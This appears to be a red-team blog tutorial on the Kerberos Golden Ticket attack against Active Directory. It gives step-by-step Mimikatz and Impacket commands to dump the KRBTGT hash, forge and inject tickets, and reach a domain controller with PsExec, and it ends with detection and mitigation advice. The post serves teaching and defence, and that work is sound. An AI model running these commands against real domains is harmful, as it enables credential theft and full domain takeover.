---
title:  "Kerberos attacks 4-golden Ticket "
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: "Kerberos attacks 4-golden Ticket"
categories:
  - Red-Teaming
toc: true
---

## golden Ticket
* is a famous technique of impersonating users on an AD domain by abusing Kerberos authentication
* A Golden Ticket is a type of attack in which an adversary gains control over an Active Directory Key Distribution Service Account (KRBTGT), and uses that account to forge valid Kerberos Ticket Granting Tickets (TGTs). This gives the attacker access to any resource on an Active Directory Domain
* Golden Ticket give attackers unrestricted access to networked resources and the ability to forge new tickets, allowing them to reside on networks indefinitely by being disguised as credentialed administrator-level users.

The TGT is encrypted using the KRBTGT account, KDC will decrypt this and issue the service ticket with the same group memberships and validation info found in the TGT.

if you have the KRBTGT hash, you can forge your own TGT which includes the PAC data with any group membership you want! including domain admins

sending this to the KDC will result in a service ticket with a domain admin group membership inside


## Forging Kerberos Tickets
* Forging Kerberos tickets depends on the password hash available to the attacker
* Golden Ticket requires the KRBTGT password hash.
* Silver ticket requires the Service Account (either the computer account or user account) password hash.
* Create anywhere and user anywhere on the network, without elevated rights.

## requirements for forging TGT
 * Domain Name
 * SID
 * Domain KRBTGT Account NTLM password hash
 * Impersonate user
 
```
kerberos::golden  ## Name of the module  
/user:Administrator  ## username of which the TGT is generated
/domain:karim.net  ## Domain 
/sid:5-1-5-21-268341927-4156871508- 1792461683  ## SID of the domain 
/krbtgt:a9b30e5bOdc865eadcea9411e4ade72d   NTLM (RC4) hash of the krbtgt account. Use /aes128 and /aes256 for using AES keys. 
/id:500 /groups:512 Optional User RID (default 500) and Group default 513 512 520 518 519)
/ptt  ## Injects the ticket in current PowerShell process ,no need to save the ticket on disk 
/startoffset:0  ##Optional when the ticket is available (default 0 - right now) in minutes. Use negative for a ticket available from past and a larger number for future. 
/endin:600  ##Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes 
/renewmax:10080  ##Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 
```
## golden ticket with Mimikatz
Mimikatz is available for Kerberos attack, it allows to create the forged ticket and simultaneously pass the TGT to KDC service
 
generate the ticket for impersonating user with RID 500. 
```
kerberos::golden /domain:karim.net /sid:S-1-5-21-750046758-1551849808-2392872301 /rc4:564e72d3c6c1927de1d2f252665e7c54  /user:admin /id:500 /ptt
```
<img src="/img/golden/m1.PNG" alt="Getting-gz" width="1000" height="200"> 


get a new cmd prompt which will allow to connect with domain server using PsExec.exe
```
mimikatz # misc::cmd
```
```
PsExec64.exe \\10.0.0.1 powershell.exe
```
<img src="/img/golden/connectm.PNG" alt="Getting-gz" width="1000" height="200"> 

## golden ticket with Impacket
used for lookupid python script to enumerate the Domain SID.
```
python3 lookupsid.py user/Administrator:password@ip
python3 lookupsid.py admin/Administrator:p@ssw0rd@192.168.128.140
```

<img src="/img/golden/sidk.PNG" alt="Getting-gz "width="1000" height="200"> 

used secretsdump.py the python script for extracting Krbtgt hash
```
python3 secretsdump.py administrator:p@ssw0rd@192.168.128.140 -outputfile krbhash -user-status   
```

<img src="/img/golden/secretdump.PNG" alt="Getting-gz" width="1000" height="200"> 

Use ticketer.py script that will create TGT/TGS tickets,Tickets duration is fixed to 10 years from now.
```
sudo ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> baduser
sudo python3 ticketer.py -nthash 564e72d3c6c1927de1d2f252665e7c54 -domain-sid S-1-5-21-750046758-1551849808-2392872301 -domain karim.net admin
```

<img src="/img/golden/crer.PNG" alt="Getting-gz" width="1000" height="200"> 

Use ticket_converter.py script which will convert kirbi files into ccache file
```
sudo python3 ticketConverter.py admin.ccache ticket.kirbi  
```

<img src="/img/golden/convert.PNG" alt="Getting-gz" width="1000" height="200"> 

whenever you want to access the Domain server service you can use the ticket.kirbi file
```
kerberos::ptt ticket.kirbi
misc::cmd
```

<img src="/img/golden/connect1.PNG" alt="Getting-gz" width="1000" height="200"> 

get a new cmd prompt which will allow to connect with domain server using PsExec.exe

access the service.
```
PsExec64.exe \\10.0.0.1 cmd.exe
```

<img src="/img/golden/hh.PNG" alt="Getting-gz" width="1000" height="200"> 

## Detection
 * detecting a golden ticket attack depends on the method used. If the Mimikatz tool was dropped in your environment, antivirus might identify and block it. That said, Mimikatz itself is very simple to modify, changing its hash and invalidating any hash-based detection. 
 *  detection will ultimately rely on watching for unusual behavior. This could look like accounts accessing systems they would not normally access or accounts authenticating with different accounts. It could also be SIDs that do not match the username or generic usernames in use that do not exist in the environment.
 * it is important to audit your user and service accounts on a regular basis. If you don’t know what is usual, detecting unusual activity is virtually impossible.
 
 
## Mitigation
* Limit Domain Admins from logging on to any other computers other than Domain Controllers and a handful of Admin servers (don’t let other admins log on to these servers) Delegate all other rights to custom admin groups. This greatly reduces the ability of an attacker to gain access to a Domain Controller’s Active Directory database
* Install endpoint protection to block attackers from loading modules like mimikatz & powershell scripts
* Limit privilege for Admin and Domain Administrator access.
* Alert on known behaviours that indicates Golden Ticket or other similar attacks.
* Implement multi-factor authentication (MFA) on all external authentication points, including VPN.
* Don’t have RDP open to the internet. Seriously.  Get RDP behind a VPN, and implement MFA on it.
* Fake credentials can be injected into the LSAS cache, which would be tempting to hackers. Seeing these “honeycreds” used would clearly indicate an issue.
* Perform the reset of the krbtgt account (twice) in accordance with your password reset policies, or quarterly.
* Enable Windows Defender Credential Guard on applicable systems (Windows 10 and Server 2016 and above). Do not use on domain controllers.

* I finished part 4 in Kerberos attacks today waite me in the next part.


